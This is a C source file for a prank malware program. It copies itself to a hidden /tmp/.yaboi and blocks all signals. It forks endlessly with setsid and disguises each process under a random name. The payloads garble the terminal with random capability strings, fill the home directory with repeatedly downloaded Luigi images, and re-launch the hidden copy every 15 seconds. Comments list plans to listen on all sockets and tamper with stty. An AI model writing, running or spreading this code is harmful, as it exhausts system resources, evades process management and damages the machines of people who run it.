#include <stdio.h>
#include <string.h>
#include <curses.h>
#include <term.h>
#include <time.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <unistd.h>

void	random_pname(char *s1) {
	FILE *fp = fopen("/dev/urandom", "r");
	char *str = malloc(16);
	fread(str, 1, 15, fp);
	if (!s1) {
		str[0] = 'm';
		str[1] = 'a';
		str[2] = 'r';
		str[3] = 'e';
		str[4] = '_';
	}
	else {
		for (unsigned i = 0; s1[i] && i < 15; ++i) {
			str[i] = s1[i];
		}
	}
	prctl(PR_SET_NAME, str);
	fclose(fp);
	free(str);
}

// mlp ascii art
// curl luigi
// listen to literally all available sockets
// mess with stty

void	capmedaddy() {
	static char letters[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	char esc[2];

	random_pname("cap_m_");

	while (1) {
		esc[0] = letters[rand() % (sizeof(letters) / sizeof(*letters))];
		esc[1] = letters[rand() % (sizeof(letters) / sizeof(*letters))];
		char *s = tgetstr(esc, NULL);
		tputs(s, 0, 0);
		free(s);
	}
}

void	luigme() {
	random_pname("looig_");
	while (1) {
		system("curl 'https://ih0.redbubble.net/image.433724851.6990/flat,550x550,075,f.u3.jpg' > ~/.luigi$(date | awk '{print $4}').jpg 2>/dev/null");
	}
}

void	protection() {
	random_pname("durex_");
	while (1) {
		sleep(15);
		system("/tmp/.yaboi");
	}
}

void	thing();

static void (*g_bois[])(void) = {
	capmedaddy,
	luigme,
	protection,
};

int forkyboi() {
	int		pid;
	int		sid;
	pid = fork();
	if (pid < 0)
		exit(1);
	if (pid > 0)
		g_bois[rand() % (sizeof(g_bois) / sizeof(*g_bois))]();
	sid = setsid();
	if (sid < 0)
		exit(1);

	random_pname(NULL);

	sleep(1);
	thing();
	return (0);
}

char* concat(const char *s1, const char *s2, const char *s3)
{
	char *result = malloc(strlen(s1) + strlen(s2) + strlen(s3) + 1);
	strcpy(result, s1);
	strcat(result, s2);
	strcat(result, s3);
	return result;
}

void	thing() {
	sigset_t	mask;

	srand(time(NULL));

	random_pname(NULL);
	sigfillset(&mask);
	sigprocmask(SIG_SETMASK, &mask, NULL);	// ignore signals

	forkyboi();
}

int main(int argc, char **argv) {
	(void)argc;
	(void)argv;

	if (strcmp(argv[0], "/tmp/.yaboi")) {
		char *s = concat("cp ", argv[0], " /tmp/.yaboi");
		system(s);
		free(s);
	}

	thing();
}
